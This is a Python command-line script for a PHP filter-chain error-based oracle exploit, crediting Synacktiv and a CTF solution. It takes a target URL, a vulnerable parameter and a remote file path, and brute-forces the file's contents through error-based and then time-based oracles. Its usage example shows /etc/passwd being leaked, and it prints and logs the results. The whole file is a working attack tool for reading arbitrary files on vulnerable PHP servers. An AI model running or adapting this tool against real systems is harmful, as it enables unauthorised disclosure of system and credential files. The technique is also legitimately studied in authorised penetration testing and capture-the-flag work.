#!/usr/bin/env python3
"""
PHP Filter Chain Oracle Exploit — Refactored CLI
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ..beta..
Error-based file leaker using PHP filter chains.

Original technique : @hash_kitten
Original tool      : @_remsio_ / Synacktiv
References:
  - https://github.com/synacktiv/php_filter_chains_oracle_exploit
  - https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle
  - https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py
"""

import json
import signal
import sys
from argparse import ArgumentParser, RawTextHelpFormatter
from dataclasses import dataclass, field
from typing import Optional

from filters_chain_oracle.core.bruteforcer import RequestorBruteforcer
from filters_chain_oracle.core.requestor import Requestor
from filters_chain_oracle.core.verb import Verb

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

EXAMPLE_USAGE = """
Example
-------
  python3 filters_chain_oracle_exploit.py \\
      --target http://127.0.0.1 \\
      --file /etc/passwd \\
      --parameter page

  [*] Target  : http://127.0.0.1
  [*] File    : /etc/passwd
  [*] Method  : POST
  [+] Leak complete!
  b'cm9vdDp4OjA6...'
  b'root:x:0:0:...'
"""

DEFAULT_VERB = Verb.POST
GET_CHAR_LIMIT_WARNING = (
    "[*] GET parameter used — leak may be partial (~135 chars max by default)."
)


# ---------------------------------------------------------------------------
# Config dataclass
# ---------------------------------------------------------------------------


@dataclass
class ExploitConfig:
    """Validated, typed configuration derived from CLI arguments."""

    file: str
    target: str
    parameter: str
    data: str = "{}"
    headers: str = "{}"
    verb: Verb = DEFAULT_VERB
    in_chain: str = ""
    proxy: Optional[str] = None
    time_based_attack: bool = False
    delay: float = 0.0
    json_input: bool = False
    match: Optional[str] = None
    offset: int = 0
    log_file: Optional[str] = None


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------


def _parse_json_arg(value: Optional[str], label: str) -> str:
    """Validate that a CLI argument is valid JSON; exit on failure."""
    if value is None:
        return "{}"
    try:
        json.loads(value)
        return value
    except ValueError:
        print(f"[-] Invalid JSON for --{label}: {value!r}")
        sys.exit(1)


def _parse_verb(value: Optional[str]) -> Verb:
    if value is None:
        return DEFAULT_VERB
    try:
        return Verb[value.upper()]
    except KeyError:
        valid = ", ".join(v.name for v in Verb)
        print(f"[-] Unknown verb {value!r}. Valid options: {valid}. Defaulting to POST.")
        return DEFAULT_VERB


def build_arg_parser() -> ArgumentParser:
    parser = ArgumentParser(
        description=EXAMPLE_USAGE,
        formatter_class=RawTextHelpFormatter,
    )
    add = parser.add_argument

    # Required
    add("--target",    required=True,  help="Target URL (e.g. http://127.0.0.1)")
    add("--file",      required=True,  help="Remote file path to leak (e.g. /etc/passwd)")
    add("--parameter", required=True,  help="Vulnerable parameter name")

    # Optional
    add("--data",             help='Extra POST body fields as JSON (e.g. \'{"key":"val"}\')')
    add("--headers",          help='Extra request headers as JSON (e.g. \'{"Authorization":"Bearer tok"}\')')
    add("--verb",             help="HTTP verb: POST (default), GET, PUT, DELETE")
    add("--proxy",            help="Proxy URL (e.g. http://127.0.0.1:8080)")
    add("--in_chain",         help="String to embed in the filter chain (bypass weak strpos configs)")
    add("--time_based_attack",help="Force time-based oracle mode (e.g. True)")
    add("--delay",            help="Seconds between requests (e.g. 0.5)", type=float, default=0.0)
    add("--json",             help="Send body as JSON (--json=1)", dest="json_input")
    add("--match",            help="Response pattern to use as oracle (e.g. 'Allowed memory size of')")
    add("--offset",           help="Character offset to start leaking from", type=int, default=0)
    add("--log",              help="Append results to this log file (e.g. /tmp/output.log)", dest="log_file")

    return parser


def parse_config() -> ExploitConfig:
    """Parse and validate CLI arguments into an ExploitConfig."""
    args = build_arg_parser().parse_args()

    return ExploitConfig(
        file=args.file,
        target=args.target,
        parameter=args.parameter,
        data=_parse_json_arg(args.data, "data"),
        headers=_parse_json_arg(args.headers, "headers"),
        verb=_parse_verb(args.verb),
        in_chain=args.in_chain or "",
        proxy=args.proxy,
        time_based_attack=bool(args.time_based_attack),
        delay=args.delay,
        json_input=bool(args.json_input),
        match=args.match or False,
        offset=args.offset,
        log_file=args.log_file,
    )


# ---------------------------------------------------------------------------
# Core orchestration
# ---------------------------------------------------------------------------


class FiltersChainOracle:
    """Orchestrates requestor construction, brute-forcing, and result output."""

    def __init__(self, config: ExploitConfig) -> None:
        self.config = config
        self.requestor: Optional[Requestor] = None
        self.bruteforcer: Optional[RequestorBruteforcer] = None

    # ------------------------------------------------------------------
    # Requestor factory
    # ------------------------------------------------------------------

    def _make_requestor(self, time_based: bool) -> Requestor:
        cfg = self.config
        return Requestor(
            cfg.file,
            cfg.target,
            cfg.parameter,
            cfg.data,
            cfg.headers,
            cfg.verb,
            cfg.in_chain,
            cfg.proxy,
            time_based,
            cfg.delay,
            cfg.json_input,
            cfg.match,
        )

    def _make_bruteforcer(self, requestor: Requestor) -> RequestorBruteforcer:
        return RequestorBruteforcer(requestor, self.config.offset)

    # ------------------------------------------------------------------
    # Logging
    # ------------------------------------------------------------------

    def _log(self, content: str) -> None:
        """Append content to the log file if one is configured."""
        if not self.config.log_file:
            return
        with open(self.config.log_file, "a") as fh:
            fh.write(content)
            fh.flush()
        print(f"[*] Logged to: {self.config.log_file}")

    def _log_result(self) -> None:
        """Write a completed or partial leak result to the log file."""
        data_str = (
            self.bruteforcer.data.decode("utf-8", errors="replace")
            if self.bruteforcer.data
            else ""
        )
        self._log(
            f"# Leaked from {self.requestor.target} — file: {self.requestor.file_to_leak}\n"
            f"{data_str}\n"
        )

    # ------------------------------------------------------------------
    # Signal handling
    # ------------------------------------------------------------------

    def _handle_interrupt(self, sig, frame) -> None:
        print("\n[*] Interrupted — partial leak:")
        print(f"[+] File : {self.requestor.file_to_leak}")
        print(self.bruteforcer.base64)
        print(self.bruteforcer.data)
        self._log_result()
        sys.exit(1)

    # ------------------------------------------------------------------
    # Brute-force runner
    # ------------------------------------------------------------------

    def _run_bruteforce(self, time_based: bool) -> bool:
        """
        Build a requestor + bruteforcer, run the attack, return True on success.
        """
        self.requestor = self._make_requestor(time_based)
        self.bruteforcer = self._make_bruteforcer(self.requestor)
        self.bruteforcer.bruteforce()
        return bool(self.bruteforcer.base64)

    # ------------------------------------------------------------------
    # Result output
    # ------------------------------------------------------------------

    def _print_success(self) -> None:
        print(f"[+] Leak complete: {self.requestor.file_to_leak}")
        print(self.bruteforcer.base64)
        print(self.bruteforcer.data)
        self._log_result()

    def _print_failure(self) -> None:
        print(
            f"[-] File {self.requestor.file_to_leak!r} appears empty "
            "or the exploit did not succeed."
        )

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    def run(self) -> int:
        """
        Run the exploit. Returns an exit code (0 = success, 1 = failure).
        """
        signal.signal(signal.SIGINT, self._handle_interrupt)

        print(f"[*] Target    : {self.config.target}")
        print(f"[*] File      : {self.config.file}")
        print(f"[*] Parameter : {self.config.parameter}")
        print(f"[*] Method    : {self.config.verb.name}")

        # Primary attempt (error-based or forced time-based)
        success = self._run_bruteforce(self.config.time_based_attack)

        if success:
            self._print_success()
        else:
            self._print_failure()
            # Auto-fallback to time-based oracle
            print("[*] Falling back to time-based attack...")
            success = self._run_bruteforce(time_based=True)

            if success:
                self._print_success()
            else:
                print("[-] Time-based fallback also failed.")

        if self.config.verb == Verb.GET:
            print(GET_CHAR_LIMIT_WARNING)

        return 0 if success else 1


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------


def main() -> None:
    config = parse_config()
    oracle = FiltersChainOracle(config)
    sys.exit(oracle.run())


if __name__ == "__main__":
    main()
